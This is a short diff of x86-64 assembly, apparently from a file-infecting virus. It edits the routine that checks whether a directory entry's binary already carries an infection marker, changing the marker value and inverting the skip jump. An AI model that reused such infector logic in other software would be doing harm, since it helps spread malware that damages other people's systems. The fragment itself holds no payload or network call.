@@ -198,8 +198,8 @@ _dirent_tmp_test:                                  ; getdents the directory to i
 		jne _close_bin
 
 	_is_infected:
-		cmp dword [r15 + 1308], 0x00000074         ; check if bichooo!! ssuuuuu
-		jne _close_bin
+		cmp dword [r15 + 1308], 0x00000049         ; check if bichooo!! ssuuuuu
+		je _close_bin
 
 	_save_entry_dpuente:
 		mov r9, [r15 + 1324]
